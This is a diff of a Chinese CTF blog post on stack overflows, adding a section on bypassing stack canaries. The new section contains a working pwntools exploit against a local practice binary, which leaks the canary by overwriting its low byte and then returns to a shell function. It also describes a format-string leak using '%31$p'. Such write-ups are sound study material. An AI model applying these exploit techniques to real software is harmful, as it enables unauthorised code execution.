@@ -26,7 +26,9 @@
 <meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/1.jpg">
 <meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/2.jpg">
 <meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/3.jpg">
-<meta property="og:updated_time" content="2020-02-08T12:13:53.057Z">
+<meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/4.jpg">
+<meta property="og:image" content="http://yoursite.com/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/5.jpg">
+<meta property="og:updated_time" content="2020-02-09T06:34:39.731Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="栈溢出的总结">
 <meta name="twitter:description" content="已经好久没有做过栈方面的的题目了，虽然现在比赛中有关栈的题目已经越来越少了，但是这方面的功夫还是不应该落下，就乘着这这段时间把有关栈方面的知识都好好总结一下，省的到了比赛的时候碰到了又是手忙脚乱的。">
@@ -321,6 +323,18 @@
 <p>这里遇到的一个问题就是当我们进行了第一次泄露之后，当返回main函数后，不知道为什么栈上会坏掉一个字节，这点还需要后期的<br>调试来进行分析，就以后再进行解释。而且我发现别的做题者在使用和我基本相同的方式时栈就不会出现问题，真的把我的头都要气<br>掉了！！！！！！淦！！！！</p>
 <p>ps：经过调试后发现只要在送第一个payload的时候使用send而不是sendline，返回后的栈就不会坏掉，具体原因还需要进一步的<br>学习</p>
 <p>本道题还有一个不使用LibcSearcher库的解题思路，那就是利用DynELF和ret2csu这个通用gadgets，这样的话题目会变得比较复杂<br>这个通用gadgets的有关内容我会在下一篇文章中再进行介绍总结，本文就不细说了。</p>
+<h2 id="canary保护的bypass技巧"><a href="#canary保护的bypass技巧" class="headerlink" title="canary保护的bypass技巧"></a>canary保护的bypass技巧</h2><p>canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致</p>
+<p>这里可以随便打开一个32位的程序来看一看</p>
+<p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/4.jpg" alt="avatar"></p>
+<p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/5.jpg" alt="avatar"></p>
+<p>这里我们可以看到，函数结束的时候，程序会检查canary的值是否和院线存入栈中的值相同，如果因为栈溢出或者其他原因导致<br><em>canary</em>的值发生了变化，那么就会执行___stack_chk_fai函数，从而终止程序</p>
+<p>而想要绕过canary保护，其实方法还是很多的，这里就介绍最基础的一种，直接通过漏洞来把canary泄露出来</p>
+<h3 id="栈溢出泄露canary"><a href="#栈溢出泄露canary" class="headerlink" title="栈溢出泄露canary"></a>栈溢出泄露canary</h3><p>canary的值是以”\x00”来结尾的，其目的就是保证canary可以截断字符串。因此，泄露栈中的canary的思路就是通过覆盖canary的<br>低字节，以打印出剩下的部分<br>还是上面那个例子，题目很简单，应该算是canary的启蒙题，直接给出自己的exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./canary&apos;)</span><br><span class="line">shell = 0x0804859b</span><br><span class="line">payload1 = &apos;a&apos;*(0x70-0xc)+&apos;b&apos;</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">#print p.recv()</span><br><span class="line">p.recvuntil(&apos;a&apos;*0x64)</span><br><span class="line">canary = u32(p.recv(4))-0x62</span><br><span class="line">print hex(canary)</span><br><span class="line">payload2 = &apos;a&apos;*0x64+p32(canary)+&apos;b&apos;*12+p32(shell)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到我们在送进去第一个payload之后，我们用’b’来覆盖了canary的低字节，这样就可以让字符串不被’\x00’给截断<br>从而让printf函数把canary也当成是变量给输出出来，所以接收到之后只要在减去0x62，低字节又变成了00，就是正确的<br>canary了，之后就是比较正常的rop拿到shell</p>
+<h3 id="利用格式化字符串漏洞泄露canary"><a href="#利用格式化字符串漏洞泄露canary" class="headerlink" title="利用格式化字符串漏洞泄露canary"></a>利用格式化字符串漏洞泄露canary</h3><p>同样是上面的例子，由于师兄那时候出题时的疏忽，所以这道题其实还有一个格式化字符串的漏洞。这里我们简单的计算一下偏移，<br>格式化字符串的偏移是6，再加上canary的偏移应该是25(100/4)，那就是三十一，所以输入%31$p就能够直接把canary打印出来。<br>就不进行赘述了</p>
+<p>准备有时间直接利用这个漏洞修改一下got表试一下，应该也是蛮有趣的 哈哈</p>
 
       
     </div>
@@ -332,7 +346,7 @@
         <p><span>本文标题:</span><a href="/2020/02/08/栈溢出的总结/">栈溢出的总结</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HeZhaochen</a></p>
         <p><span>发布时间:</span>2020-02-08, 13:29:03</p>
-        <p><span>最后更新:</span>2020-02-08, 20:13:53</p>
+        <p><span>最后更新:</span>2020-02-09, 14:34:39</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/02/08/栈溢出的总结/" title="栈溢出的总结">http://yoursite.com/2020/02/08/栈溢出的总结/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/02/08/栈溢出的总结/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -362,7 +376,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的ret2libc"><span class="toc-number">1.</span> <span class="toc-text">简单的ret2libc</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的ret2libc"><span class="toc-number">1.</span> <span class="toc-text">简单的ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#canary保护的bypass技巧"><span class="toc-number">2.</span> <span class="toc-text">canary保护的bypass技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#栈溢出泄露canary"><span class="toc-number">2.1.</span> <span class="toc-text">栈溢出泄露canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用格式化字符串漏洞泄露canary"><span class="toc-number">2.2.</span> <span class="toc-text">利用格式化字符串漏洞泄露canary</span></a></li></ol></li></ol>
         
     </div>
     <style>
